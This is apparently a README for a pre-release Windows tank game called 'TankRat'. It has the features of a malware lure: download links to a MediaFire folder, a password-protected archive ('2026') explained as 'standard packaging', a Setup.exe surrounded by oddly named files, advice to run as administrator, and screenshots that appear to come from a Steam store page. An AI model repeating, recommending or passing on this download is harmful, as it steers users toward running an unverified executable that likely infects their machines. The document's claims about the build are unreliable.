<div align="center">

# 🎮 TankRat

**A rough tank prototype built to be broken, tested, and rebuilt.**

[![Status](https://img.shields.io/badge/status-pre--release-orange)](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)
[![Download](https://img.shields.io/badge/download-file-00b8ff?logo=googledrive&logoColor=white)](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)

[Download](#-installation--setup) · [Screenshots](#-screenshots) · [System Requirements](#-system-requirements)

</div>

---

## 🕹️ About

TankRat is a single-player action-adventure game set in a post-apocalyptic wasteland where mechanical creatures roam among the ruins. Control a hardened drone, salvage wreckage, dismantle enemies, and rebuild combat machines from the parts you recover. This Windows build is an unfinished, raw prototype shared for testing and feedback while development continues.

For players who enjoy single-player vehicular action, post-apocalyptic worlds, scavenging, and unpolished experimental builds.

> ⚠️ **This is an early, unfinished pre-release build.** The game is under active development: expect bugs, unfinished content, and balance changes.
>
> 🔒 The archive is password-protected (`2026`) as a standard packaging step to keep the build bundled correctly during distribution. Use the password when extracting.

## ✨ Features

- ⚙️ **Salvage and Rebuild** — Strip wreckage for weapons, armor, technology, and upgrade materials.
- 🪖 **Armored Combat** — Fight corrupted mechanical enemies using mobile combat tanks.
- ☢️ **Post-Apocalyptic Wasteland** — Explore the ruined Event Containment Area and its hostile machine-infested zones.
- 🧪 **Experimental Dev Build** — Test an early work-in-progress version and help identify bugs and rough edges.
- 🔧 **Modular Machines** — Customize your combat rig by fitting recovered parts to suit the situation.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1637460/63ff63f9500434422a528060315617ca7d7be236/ss_63ff63f9500434422a528060315617ca7d7be236.1920x1080.jpg?t=1787688772" alt="Screenshot 1" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1637460/508101bafa97e823dda7b061dcbefe38d0ff61c6/ss_508101bafa97e823dda7b061dcbefe38d0ff61c6.1920x1080.jpg?t=1787688772" alt="Screenshot 2" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1637460/5457fda7657001ea62629d56c8ef76521f3580f5/ss_5457fda7657001ea62629d56c8ef76521f3580f5.1920x1080.jpg?t=1787688772" alt="Screenshot 3" width="100%"></td>
 </tr>
</table>


## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 64-bit | Windows 11 64-bit |
| **Processor** | Intel Core i5-8400 or AMD Ryzen 5 2600 | Intel Core i7-10700 or AMD Ryzen 7 3700X |
| **RAM** | 8 GB | 16 GB |
| **Graphics** | NVIDIA GeForce GTX 1060 6 GB or AMD Radeon RX 580 | NVIDIA GeForce RTX 2060 or AMD Radeon RX 6600 |
| **Storage** | 45 GB available space | 45 GB available space on an SSD |
| **Additional** | DirectX 12, 64-bit operating system | DirectX 12, Visual C++ Redistributable 2022 |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |
### Step 1: Download

You can download the build from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**. The archive contains everything you need to run the game.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder**.
3. Do not rename or move individual files — the build expects its folder structure intact.
4. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- api.pak <- API modules
|-- driver.pak <- Driver archive
|-- launcher.dll <- Launcher library
|-- driver.umap <- Driver data
|-- localization.ini <- Language files
|-- res.pak <- Resources archive
|-- audio.res <- Audio resources
|-- update_1.ini <- Update config
|-- global.cfg <- Global settings
|-- patch_1.bnk <- Audio banks
|-- assets.wem <- Asset audio
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- settings.bin <- Configuration
|-- physics.sys <- Physics engine
|-- installer.dat <- Installer data
|-- animations.dll <- Animation system
|-- license.bank <- License data
|-- license.wem <- Audio assets
|-- Password 2026.txt <- Password reminder (empty)
|-- lang.sys <- Language system
|-- dlc.md5 <- DLC checksums
|-- uninstall.key <- Uninstall key
|-- update_1.res <- Update resources
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the pre-release build.
3. Enjoy the build — expect bugs, unfinished content, and balance changes.

---

⚠️ **Note:** This is an early, unfinished pre-release build. Some features may be incomplete or broken.

## ❓ Frequently Asked Questions (FAQ)

**Q: What exactly is this?**
**A:** This is an early, unfinished development build of the game. It is a pre-alpha / work-in-progress prototype, not the final retail version. Expect missing features, placeholder assets, debug overlays, and rough edges.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: What should I do if the game crashes?**
**A:** Crashes are expected in this early stage. Try running the build as administrator, ensure your GPU drivers are up to date, and check the Issues tab for known problems.

**Q: Does this build require an internet connection?**
**A:** No. The build runs fully offline. No account, launcher, or online check is required to launch it.

**Q: Can I share this build with others?**
**A:** Yes, you can share the link to this repository. Please do not reupload the build to other platforms — keeping distribution in one place makes updates easier to track.


---

<div align="center">
If you like this project, consider leaving a ⭐
</div>